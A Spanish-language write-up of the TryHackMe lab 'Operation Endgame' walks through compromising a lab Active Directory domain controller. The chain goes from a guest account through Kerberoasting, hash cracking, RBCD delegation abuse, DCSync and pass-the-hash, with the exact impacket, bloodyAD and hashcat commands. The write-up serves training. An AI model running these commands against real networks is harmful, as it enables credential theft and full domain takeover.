# Operation Endgame

| **Dificultad** | Hard |
| **Tipo** | CTF |
| **Slug** | `operationendgame` |
| **Link** | [TryHackMe](https://tryhackme.com/room/operationendgame) |
| **Sección** | 03 Level Hard |
| **Fuente** | Web (API THM `api/v2/rooms/tasks?roomCode=operationendgame` + websearch de walkthroughs) |
| **Componentes** | Active Directory / BloodHound / Kerberoasting / RBCD / DCSync / Pass-the-Hash / impacket / bloodyAD |
| **Impacto** | Compromiso completo de Domain Controller a partir de una cuenta guest con permisos delegados desproporcionados. |

---

**Contexto:** Sala de dominio Active Directory de dificultad Hard que remata en tomar el control del Domain Controller. La cadena arranca desde una cuenta `guest` casi sin privilegios: enumeración con BloodHound (rusthound-ce), Kerberoasting de la cuenta `CODY_ROY`, crackeo del TGS con hashcat, y el descubrimiento de que guest tiene permisos anómalos (misconfig intencionada) que permiten GenericWrite sobre la cuenta de máquina `AD$`. Con Resource-Based Constrained Delegation (RBCD) se falsifica un ticket como Administrator y, tras esparcir los permisos de DCSync, se vuelcan los hashes del DC para acabar con un Pass-the-Hash y leer la flag del escritorio de Administrator.

## Solucionario

### Task 1: Find The Flag

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What's the flag? | `THM{...redacted...}` |

---

**Metodología:**

1. Reconocimiento con `nmap` → DC Windows Server 2019 (dominio `thm.local`) con DNS (53), HTTP (80/443), Kerberos (88), SMB (139/445), RPC (135/593), LDAP (389/636/3268/3269), RDP (3389), WSMAN (47001), etc.
2. Acceso inicial como guest: `nxc smb <IP> -u '' -p ''` → null session denegada. `nxc smb <IP> -u guest -p ''` → acceso con `IPC$` en modo solo lectura.
3. Enumeración con BloodHound: `rusthound-ce -d thm.local -u guest -p ''` recolecta datos con el mínimo privilegio → se importan en BloodHound.
4. Kerberoasting: BloodHound señala a `CODY_ROY` como kerberoastable (SPN `HTTP/server.secure.com`). `GetUserSPNs.py thm.local/guest -no-pass -request` → hash TGS `$krb5tgs$23$...`.
5. Crack del TGS: `hashcat -m 13100 hash rockyou.txt` → password de `CODY_ROY` recuperada.
6. Descubrir la anomalía: Con credenciales de `CODY_ROY`, `bloodyAD get writable` revela que guest tiene permisos desproporcionados: GenericWrite sobre la cuenta de máquina `AD$` (misconfig intencionada de la sala).
7. RBCD: `bloodyAD add rbcd "AD$" "CODY_ROY"` añade a `CODY_ROY` como delegado de servicios permitido en `AD$`.
8. Impersonar a Administrator: `getST.py -spn "ldap/AD.THM.LOCAL" -impersonate Administrator -dc-ip <IP> thm.local/cody_roy:<pass>` → S4U2Self + S4U2Proxy → TGT/ticket de Administrador para el LDAP.
9. DCSync: `bloodyAD add dcsync cody_roy` concede permisos de DCSync a `cody_roy` → `secretsdump.py -just-dc-user Administrator -k -no-pass thm.local/Administrator@<IP>` vuelca los hashes.
10. Pass-the-Hash → flag: Con el NT hash de Administrator: `smbclient //<IP>/C$ -U Administrator --pw-nt-hash` (o `atexec`) → leer `C:\Users\Administrator\Desktop\flag.txt.txt` → flag.

```
guest (sin password / null denegada)
  -> rusthound-ce + BloodHound
  -> usuario kerberoastable CODY_ROY (SPN HTTP/server.secure.com)
  -> GetUserSPNs.py thm.local/guest -no-pass -request -> $krb5tgs$23$...
  -> hashcat -m 13100 + rockyou -> crack CODY_ROY
  -> anomalia de permisos: guest tiene GenericWrite sobre AD$ (misconfig)
  -> bloodyAD add rbcd "AD$" "CODY_ROY"     (Resource-Based Constrained Delegation)
  -> getST.py -spn ldap/AD.THM.LOCAL -impersonate Administrator (S4U2Self+S4U2Proxy)
  -> bloodyAD add dcsync cody_roy
  -> secretsdump.py -just-dc-user Administrator -> hashes NT de Admin
  -> Pass-the-Hash (smbclient/atexec) -> C:\Users\Administrator\Desktop\flag.txt.txt -> flag
```

**Learning chain:** Guest access → BloodHound enumeration → Kerberoasting (CODY_ROY) → TGS crack → Anomalous GenericWrite permissions → RBCD delegation abuse → Administrator impersonation → DCSync → Pass-the-Hash → DC flag

**MITRE ATT&CK:** T1078.002 (Valid Accounts: Domain Accounts), T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting), T1098.001 (Account Manipulation: Additional Cloud Credentials), T1003.006 (OS Credential Dumping: DCSync), T1550.002 (Use Alternate Authentication Material: Pass the Hash)

**Fuente:** [TryHackMe - Operation Endgame](https://tryhackme.com/room/operationendgame)
